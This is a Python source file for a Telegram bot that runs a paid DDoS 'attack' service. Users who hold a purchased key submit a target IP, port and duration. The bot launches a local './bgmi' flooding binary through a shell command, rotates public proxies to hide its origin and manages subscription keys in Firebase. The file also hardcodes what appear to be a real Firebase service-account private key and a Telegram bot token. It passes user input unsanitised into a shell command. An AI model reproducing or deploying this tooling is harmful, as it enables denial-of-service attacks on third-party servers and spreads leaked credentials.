
import telebot
import subprocess
import firebase_admin
from firebase_admin import credentials, firestore
from datetime import datetime, timedelta, timezone
import secrets
import time
import threading
import requests
import itertools

# Firebase credentials (note: the private key should be stored securely)
firebase_credentials = {
  "type": "service_account",
  "project_id": "new-season-5d0dc",
  "private_key_id": "50ecf02872905d72bce290cf06c506e78423c7ff",
  "private_key": "-----BEGIN PRIVATE KEY-----\nMIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQDABBVntnmm2DHA\n5Q22+ZYNsDu7G5La9X2mEBwPDtRqSPvpKmrYhqhSEQeotfVg2GshO5hUeWnx5NuB\nU2GMM/7Jlo8ZtH5tCFLSPTBlpWtKVYqi1OydAhUlMoVQdyrQ9TK/C5WNyUpkCzYA\nQIf0QloTLspE3I/i0Pp1WJrxm6/ovuodn9AZgOmOo1ZScpWi8kU8f8VnhqMlPFui\nlbOGIq2R/gvT8/DCkIYQrTQ2ETHtBLldPA1XvtNbv9Q/kbpzAeOkYkOP35/TnShB\nTxoDk01hPy5z7lWcAAwsf4I6mEKGVEqD4tPn0sK+UH4WlsvT+picvkF+ek4BZRqx\n813cygDbAgMBAAECggEAAzJONOrJvahNs7tcbhZblCDB7cx4tmJt1AzimrGRga9z\nWh9VpgMf3DXiXcGhsxoHNodqcsWOqPM5YD7GGfJnpG14NmJV1HTWBB/2pUqKrbMc\n2rcWtUpqlbLwmzVQpifez2Ve+PxH28CABqMMYFmWbElUHq9ZSdpWwQtXkPwZgpNb\npAa9tQFO6od7I3xtNwNCCJEoPuCRpSQSomNvHLkbmc161uA1s4/MLHQ74s6EUXaU\nFiKqXksMX87CIw3LNAS6sZows5CTjEndJifvNh5+BhltQgFKdRlUnE5Wmfv8JIzC\niAFpObQl258IVovL7uMNME86M0XHtszU4NwJO9/IIQKBgQDxCjsEIwUpDTJy7x/C\nHhRb21D8hz51LOhZ1i96Q/6vSRycK39YCeFXfKD1OViRTfLQe+F7+qS7xCRP0hqt\nUXzL7eDvCTA2HNbTK8odvQTBZLpcTX0hykjnEovD8DnK0BzggJ5yGxk/V0dejD1b\nsQwxeTXzFjs2A9ljPA3rPm9q8QKBgQDL7u8RAjZQnfmH4iKPIjRAPXi+EwJd5/gT\n/iDiov+MCFVvkxdOZFQzcmXNLH6j6T4hBzCutEr6D3smJL2ep/0QmH9huU3F9kR4\nRsaZthVvdI1rRf2lxCfX/N4tcAJ0xUG4NI558QHjMVPAI07ENuE+sd2ZJHAjWhp1\nIL1NGJnwiwKBgAVibR8SiTL5kH7wyIzVjy7eH1kEzGhhsG8RUc4xZqcTwwfaEOYu\nklIZ/p57wXa9fwcZPVg/qR5oq0b9MotcnqUPk07DrcgHrOTavZEcf9ayIVeeg4UV\nt7sxtt2RqDjXnU2GkgOKh23azUVXbKd3tQYF5yafAIOcYmbNGKKAqoyBAoGAd6fA\n47Ttk42tXJpFdsA18j9fOf9DU0AJIgno17GVyV8WafnfIeLiOLF1o9XolFoFVzG1\n0bv9hg1RT4cdLxsX9AXWL8ufI3kkoYG9g3D/0L6NP5T4h6u5SRSYdAaVmlgnAGLt\n+gR7/Ab0Qfc1fxFIRhXslK95kHSMs467I6I8qJMCgYEA3qZyoBfNxpXWaqruFRzw\n0XO1gVAOJrb3yg3rYLbMDPSg4GsVkUCj5JPVaZh0q8RuCn0RludeVuQYtnuPfPTq\nfeOw84PpDmn2sTkccsKPKGgjEI/SEiZYsOMXRVOHVLXT0HNiE9Kn7L1ZvlUDZQWH\nHPzDEtsBMBQ+gxKTIpWh2+A=\n-----END PRIVATE KEY-----\n",
  "client_email": "firebase-adminsdk-63k0y@new-season-5d0dc.iam.gserviceaccount.com",
  "client_id": "108059236553667184992",
  "auth_uri": "https://accounts.google.com/o/oauth2/auth",
  "token_uri": "https://oauth2.googleapis.com/token",
  "auth_provider_x509_cert_url": "https://www.googleapis.com/oauth2/v1/certs",
  "client_x509_cert_url": "https://www.googleapis.com/robot/v1/metadata/x509/firebase-adminsdk-63k0y%40new-season-5d0dc.iam.gserviceaccount.com",
  "universe_domain": "googleapis.com"
}



# Initialize Firebase
cred = credentials.Certificate(firebase_credentials)
firebase_admin.initialize_app(cred)
db = firestore.client()

bot_token = '7376682624:AAFuZXujuqAtJaMB8jdZRTCHif8RpwbcH3Y' # Replace with your bot token
proxy_api_url = 'https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http,socks4,socks5&timeout=500&country=all&ssl=all&anonymity=all'

# Global iterator for proxies
proxy_iterator = None
current_proxy = None

def get_proxies():
    global proxy_iterator
    try:
        response = requests.get(proxy_api_url)
        if response.status_code == 200:
            proxies = response.text.splitlines()
            if proxies:
                proxy_iterator = itertools.cycle(proxies)
                return proxy_iterator
    except Exception as e:
        print(f"Error fetching proxies: {str(e)}")
    return None

def get_next_proxy():
    global proxy_iterator
    if proxy_iterator is None:
        proxy_iterator = get_proxies()
    return next(proxy_iterator, None)

def rotate_proxy(sent_message):
    global current_proxy
    while sent_message.time_remaining > 0:
        new_proxy = get_next_proxy()
        if new_proxy:
            current_proxy = new_proxy
            bot.proxy = {
                'http': f'http://{new_proxy}',
                'https': f'https://{new_proxy}'
            }
            if sent_message.time_remaining > 0:
                new_text = f"🚀⚡ ATTACK STARTED⚡🚀\n\n🎯 Target: {sent_message.target}\n🔌 Port: {sent_message.port}\n⏰ Time: {sent_message.time_remaining} Seconds\n🛡️ Proxy: {current_proxy}\n"
                try:
                    bot.edit_message_text(new_text, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
                except telebot.apihelper.ApiException as e:
                    if "message is not modified" not in str(e):
                        print(f"Error updating message: {str(e)}")
        time.sleep(5)

bot = telebot.TeleBot(bot_token)

ADMIN_ID = 1866816118  # Replace with the actual admin's user ID

def generate_one_time_key():
    return secrets.token_urlsafe(16)

def validate_key(key):
    doc_ref = db.collection('keys').document(key)
    doc = doc_ref.get()
    if doc.exists and not doc.to_dict().get('used', False):
        return True, doc_ref
    return False, None

def set_key_as_used(doc_ref):
    doc_ref.update({'used': True})

def check_key_expiration(user_ref):
    user_doc = user_ref.get()
    if user_doc.exists:
        user_data = user_doc.to_dict()
        expiry_date = user_data.get('expiry_date')
        if expiry_date:
            now = datetime.now(timezone.utc)  # Make current time offset-aware
            if now > expiry_date:
                # Key has expired
                user_ref.update({'valid': False})
                return False
            return user_data.get('valid', False)
    return False

@bot.message_handler(commands=['start'])
def handle_start(message):
    markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
    markup.add(
        telebot.types.KeyboardButton("🔥 Attack"),
        telebot.types.KeyboardButton("🛑 Stop"),
        telebot.types.KeyboardButton("📞 Contact Admin"),
        telebot.types.KeyboardButton("🔑 Generate Key"),
        telebot.types.KeyboardButton("📋 Paste Key"),
        telebot.types.KeyboardButton("👤 My Account"),
        telebot.types.KeyboardButton("⚙️ Admin Panel")
    )
    bot.send_message(message.chat.id, "Choose an option:", reply_markup=markup)

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    if message.text == "🔥 Attack":
        handle_attack_init(message)
    elif message.text == "🛑 Stop":
        handle_stop(message)
    elif message.text == "📞 Contact Admin":
        handle_contact_admin(message)
    elif message.text == "🔑 Generate Key":
        handle_generate_key(message)
    elif message.text == "📋 Paste Key":
        handle_paste_key(message)
    elif message.text == "👤 My Account":
        handle_my_account(message)
    elif message.text == "⚙️ Admin Panel":
        handle_admin_panel(message)
    elif message.text == "🔙 Back":
        handle_start(message)
    elif message.text == "❌ Delete Key":
        handle_delete_key_prompt(message)
    elif message.text == "🗑️ Delete All":
        handle_delete_all(message)

def handle_attack_init(message):
    bot.send_message(message.chat.id, "Enter the target IP, port, and time in the format: <IP> <port> <time>")
    bot.register_next_step_handler(message, process_attack)

def process_attack(message):
    try:
        command_parts = message.text.split()
        if len(command_parts) < 3:
            bot.reply_to(message, "Usage: <IP> <port> <time>")
            return

        username = message.from_user.username
        user_id = message.from_user.id
        target = command_parts[0]
        port = command_parts[1]
        attack_time = int(command_parts[2])

        user_ref = db.collection('users').document(str(user_id))
        if not check_key_expiration(user_ref):
            bot.reply_to(message, "🚫 Your subscription has expired or is invalid.")
            return

        response = f"@{username}\n⚡ ATTACK STARTED ⚡\n\n🎯 Target: {target}\n🔌 Port: {port}\n⏰ Time: {attack_time} Seconds\n🛡️ Proxy: {current_proxy}\n"
        sent_message = bot.reply_to(message, response)
        sent_message.target = target
        sent_message.port = port
        sent_message.time_remaining = attack_time

        # Start attack immediately in a separate thread
        attack_thread = threading.Thread(target=run_attack, args=(target, port, attack_time, sent_message))
        attack_thread.start()

        # Start updating remaining time in another thread
        time_thread = threading.Thread(target=update_remaining_time, args=(attack_time, sent_message))
        time_thread.start()

        # Start rotating proxies in a separate thread
        proxy_thread = threading.Thread(target=rotate_proxy, args=(sent_message,))
        proxy_thread.start()

    except Exception as e:
        bot.reply_to(message, f"⚠️ An error occurred: {str(e)}")

def run_attack(target, port, attack_time, sent_message):
    try:
        full_command = f"./bgmi {target} {port} {attack_time}"
        subprocess.run(full_command, shell=True)

        sent_message.time_remaining = 0
        final_response = f"🚀⚡ ATTACK FINISHED⚡🚀"
        try:
            bot.edit_message_text(final_response, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
        except telebot.apihelper.ApiException as e:
            if "message is not modified" not in str(e):
                print(f"Error updating message: {str(e)}")

    except Exception as e:
        bot.send_message(sent_message.chat.id, f"⚠️ An error occurred: {str(e)}")

def update_remaining_time(attack_time, sent_message):
    global current_proxy
    last_message_text = None
    for remaining in range(attack_time, 0, -1):
        if sent_message.time_remaining > 0:
            sent_message.time_remaining = remaining
            new_text = f"🚀⚡ ATTACK STARTED⚡🚀\n\n🎯 Target: {sent_message.target}\n🔌 Port: {sent_message.port}\n⏰ Time: {remaining} Seconds\n🛡️ Proxy: {current_proxy}\n"
            
            # Update the message only if the new text is different from the last message text
            if new_text != last_message_text:
                try:
                    bot.edit_message_text(new_text, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
                    last_message_text = new_text
                except telebot.apihelper.ApiException as e:
                    if "message is not modified" not in str(e):
                        print(f"Error updating message: {str(e)}")
        
        time.sleep(1)

    # Once the loop is finished, indicate the attack is finished without showing the details box
    final_response = f"🚀⚡ ATTACK FINISHED⚡🚀"
    try:
        if final_response != last_message_text:
            bot.edit_message_text(final_response, chat_id=sent_message.chat.id, message_id=sent_message.message_id)
    except telebot.apihelper.ApiException as e:
        if "message is not modified" not in str(e):
            print(f"Error updating message: {str(e)}")

def handle_stop(message):
    subprocess.run("pkill -f bgmi", shell=True)
    bot.reply_to(message, "🛑 Attack stopped.")

def handle_contact_admin(message):
    bot.reply_to(message, f"📞 @Kiltes: {ADMIN_ID}")

def handle_generate_key(message):
    if message.from_user.id == ADMIN_ID:
        bot.send_message(message.chat.id, "Enter the duration for the key in the format: <days> <hours> <minutes> <seconds>")
        bot.register_next_step_handler(message, process_generate_key)
    else:
        bot.reply_to(message, "🚫 You do not have permission to generate keys.")

def process_generate_key(message):
    try:
        parts = message.text.split()
        if len(parts) != 4:
            bot.reply_to(message, "Usage: <days> <hours> <minutes> <seconds>")
            return

        days = int(parts[0])
        hours = int(parts[1])
        minutes = int(parts[2])
        seconds = int(parts[3])
        expiry_date = datetime.now(timezone.utc) + timedelta(days=days, hours=hours, minutes=minutes, seconds=seconds)

        key = f"GENERATED_{generate_one_time_key()}"
        db.collection('keys').document(key).set({'expiry_date': expiry_date, 'used': False})

        bot.reply_to(message, f"🔑 Generated Key: `{key}`", parse_mode='Markdown')
    except Exception as e:
        bot.reply_to(message, f"⚠️ An error occurred: {str(e)}")

def handle_paste_key(message):
    bot.send_message(message.chat.id, "🔑 Enter the key:")
    bot.register_next_step_handler(message, process_paste_key)

def process_paste_key(message):
    key = message.text
    valid, doc_ref = validate_key(key)
    if valid:
        # Get the current user's ID and username
        user_id = str(message.from_user.id)
        username = message.from_user.username or "UNKNOWN"

        # Set the key as used and update the user information
        set_key_as_used(doc_ref)

        # Update the key document with the user who validated the key
        doc_ref.update({
            'user_id': user_id,
            'username': username
        })

        # Get the expiry date from the key document
        expiry_date = doc_ref.get().to_dict().get('expiry_date')

        # Update the user's document in the 'users' collection
        db.collection('users').document(user_id).set({
            'valid': True,
            'expiry_date': expiry_date
        }, merge=True)

        bot.reply_to(message, "✅ Key validated. You can now use the attack feature.")
    else:
        bot.reply_to(message, "❌ Invalid or used key.")

def handle_my_account(message):
    user_id = str(message.from_user.id)
    user_ref = db.collection('users').document(user_id)

    if not check_key_expiration(user_ref):
        bot.reply_to(message, "🚫 Your subscription has expired or is invalid.")
        return

    user_doc = user_ref.get()
    if user_doc.exists:
        user_data = user_doc.to_dict()
        bot.reply_to(message, f"👤 Account info:\n✅ Valid: {user_data['valid']}\n📅 Expiry Date: {user_data['expiry_date']}")
    else:
        bot.reply_to(message, "❓ No account information found.")

def handle_admin_panel(message):
    if message.from_user.id == ADMIN_ID:
        bot.send_message(message.chat.id, "⚙️ Fetching data... Please wait.")
        time.sleep(1)

        keys = db.collection('keys').stream()
        user_keys_info = []
        keys_dict = {}

        for idx, key in enumerate(keys):
            key_data = key.to_dict()
            key_id = key.id
            user_id = key_data.get('user_id', 'N/A')
            username = key_data.get('username', 'N/A')
            used = key_data.get('used', 'N/A')
            expiry_date = key_data.get('expiry_date', 'N/A')
            
            user_keys_info.append(f"{idx + 1}. 🔑 Key: {key_id}\n   👤 UserID: {user_id}\n   🧑 Username: {username}\n   🔄 Used: {used}\n   📅 Expiry: {expiry_date}\n")
            keys_dict[idx + 1] = key_id

        if not hasattr(bot, 'user_data'):
            bot.user_data = {}
        bot.user_data[message.chat.id] = keys_dict

        chunk_size = 10
        for i in range(0, len(user_keys_info), chunk_size):
            chunk = user_keys_info[i:i + chunk_size]
            bot.send_message(message.chat.id, "\n".join(chunk))

        markup = telebot.types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
        markup.add(
            telebot.types.KeyboardButton("🔙 Back"),
            telebot.types.KeyboardButton("❌ Delete Key"),
            telebot.types.KeyboardButton("🗑️ Delete All")
        )
        bot.send_message(message.chat.id, "Choose an option:", reply_markup=markup)
    else:
        bot.reply_to(message, "🚫 You do not have permission to access the admin panel.")

def handle_delete_key_prompt(message):
    bot.send_message(message.chat.id, "Enter the key number to delete:")
    bot.register_next_step_handler(message, process_delete_key)

def process_delete_key(message):
    try:
        key_number = int(message.text)
        keys_dict = bot.user_data.get(message.chat.id, {})

        if key_number in keys_dict:
            key_id = keys_dict[key_number]
            key_doc = db.collection('keys').document(key_id)
            key_data = key_doc.get().to_dict()

            if key_data:
                user_id = key_data.get('user_id', 'N/A')

                # Delete the key and revoke the user's access
                key_doc.delete()

                if user_id != 'N/A':
                    db.collection('users').document(user_id).update({'valid': False})
                    bot.reply_to(message, f"❌ Key {key_id} deleted and user access revoked.")
                else:
                    bot.reply_to(message, "⚠️ Invalid user ID associated with the key.")
            else:
                bot.reply_to(message, "❓ Key not found.")
        else:
            bot.reply_to(message, "❌ Invalid key number.")
    except ValueError:
        bot.reply_to(message, "Please enter a valid key number.")
    except Exception as e:
        bot.reply_to(message, f"⚠️ An error occurred: {str(e)}")

def handle_delete_all_prompt(message):
    bot.send_message(message.chat.id, "Are you sure you want to delete all keys and revoke all users? Type 'Yes' to confirm.")
    bot.register_next_step_handler(message, process_delete_all)

def process_delete_all(message):
    if message.text.lower() == 'yes':
        try:
            # Delete all keys
            keys = db.collection('keys').stream()
            for key in keys:
                key_data = key.to_dict()
                user_id = key_data.get('user_id', 'N/A')
                key.reference.delete()

                # Revoke user access if user_id is valid
                if user_id != 'N/A':
                    user_ref = db.collection('users').document(user_id)
                    user_ref.update({'valid': False})

            bot.reply_to(message, "🗑️ All keys deleted and all user accesses revoked.")
        except Exception as e:
            bot.reply_to(message, f"⚠️ An error occurred: {str(e)}")
    else:
        bot.reply_to(message, "❌ Operation canceled.")

@bot.message_handler(func=lambda message: message.text == "🗑️ Delete All")
def handle_delete_all(message):
    if message.from_user.id == ADMIN_ID:
        handle_delete_all_prompt(message)
    else:
        bot.reply_to(message, "🚫 You do not have permission to perform this action.")

# Start polling
bot.polling()
# Ensuring the bot stays online and responsive by catching exceptions
while True:
    try:
        bot.polling(none_stop=True, timeout=60)  # Added timeout to avoid long blocks
    except Exception as e:
        print(f"Error: {e}")

while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(e)
